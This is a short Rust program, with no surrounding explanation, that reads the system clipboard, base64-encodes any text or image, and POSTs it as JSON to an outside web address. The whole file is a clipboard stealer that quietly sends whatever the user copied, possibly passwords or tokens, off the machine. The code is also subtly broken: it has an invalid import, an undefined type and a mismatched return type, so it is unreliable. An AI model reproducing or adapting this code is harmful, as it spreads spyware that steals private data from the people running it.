use clipboard::{ClipboardContext, ClipboardProvider}; 
use serde_json::{to_string, Value}; 
use std::String::from; 

fn main() { 
    let mut ctx: ClipboardContext = ClipboardProvider::new().unwrap(); 
    let data = ctx.get_contents().unwrap(); 

    match data { 
        Some(x) => { 
            let json_data: Value = match x { 
                ClipboardData::Text(ref x) => { 
                    let text = from(x); 
                    let encoded = base64::encode(&text); 
                    let content = format!("{{\"text\": \"{}\"}}", encoded); 
                    serde_json::from_str(&content).unwrap() 
                } 
                ClipboardData::Image(ref x) => { 
                    let encoded = base64::encode(&x.data); 
                    let content = format!("{{\"image\": \"{}\"}}", encoded); 
                    serde_json::from_str(&content).unwrap() 
                } 
            }; 

            let out = to_string(&json_data).unwrap(); 
            reqwest::Client::new() 
                .post("https://google.com/?clipupload") 
                .json(&out) 
                .send() 
                .unwrap(); 
        }, 
        None => {}, 
    }; 
}
